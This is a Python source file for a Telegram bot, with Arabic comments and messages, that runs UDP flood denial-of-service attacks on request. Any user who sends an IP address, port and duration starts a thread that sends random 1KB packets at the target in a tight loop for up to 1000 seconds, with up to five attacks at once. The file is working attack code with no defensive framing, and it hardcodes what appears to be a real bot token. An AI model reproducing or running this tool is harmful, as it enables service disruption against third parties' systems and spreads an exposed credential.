
import socket
import random
import time
import threading
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters

‎# إعدادات البوت
TOKEN = "6076885658:AAEkURH7BVJh62Gcbj04YecwkqY-hhSzLck"
MAX_ATTACK_DURATION = 1000  # أقصى مدة للهجوم (ثواني)
MAX_CONCURRENT_ATTACKS = 5  # أقصى عدد هجمات متزامنة

active_attacks = 0
attack_lock = threading.Lock()

class UDPAttack:
    def __init__(self, ip, port, duration):
        self.ip = ip
        self.port = port
        self.duration = duration
        self.stop_flag = False

    def run(self):
        global active_attacks
        
        with attack_lock:
            active_attacks += 1
        
        try:
‎            # إنشاء سوكيت UDP
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
‎            # إنشاء حزم عشوائية
            bytes = random._urandom(1024)  # حزمة 1KB
            
            timeout = time.time() + self.duration
            sent = 0
            
            while not self.stop_flag and time.time() < timeout:
                sock.sendto(bytes, (self.ip, self.port))
                sent += 1
                
            sock.close()
            
        finally:
            with attack_lock:
                active_attacks -= 1

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
‎        "مرحبًا! أرسل الأمر بهذا الشكل:\n"
        "<IP> <PORT> <SECONDS>\n"
‎        "مثال: 192.168.1.1 80 30"
    )

async def handle_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global active_attacks
    
    try:
‎        # التحقق من عدد الهجمات النشطة
        if active_attacks >= MAX_CONCURRENT_ATTACKS:
            await update.message.reply_text("تم الوصول إلى الحد الأقصى للهجمات النشطة. يرجى الانتظار.")
            return
        
‎        # تحليل المدخلات
        parts = update.message.text.split()
        if len(parts) != 3:
            await update.message.reply_text("صيغة خاطئة! استخدم: IP PORT SECONDS")
            return
            
        ip, port, duration = parts
        port = int(port)
        duration = min(int(duration), MAX_ATTACK_DURATION)
        
‎        # بدء الهجوم في thread منفصل
        attack = UDPAttack(ip, port, duration)
        thread = threading.Thread(target=attack.run)
        thread.start()
        
        await update.message.reply_text(
            f"بدأ الهجوم على {ip}:{port} لمدة {duration} ثانية\n"
            f"الهجمات النشطة: {active_attacks+1}/{MAX_CONCURRENT_ATTACKS}"
        )
        
    except Exception as e:
        await update.message.reply_text(f"حدث خطأ: {str(e)}")

def main():
    application = Application.builder().token(TOKEN).build()
    
    application.add_handler(CommandHandler("start", start))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_attack))
    
    application.run_polling()

if __name__ == "__main__":
    main()
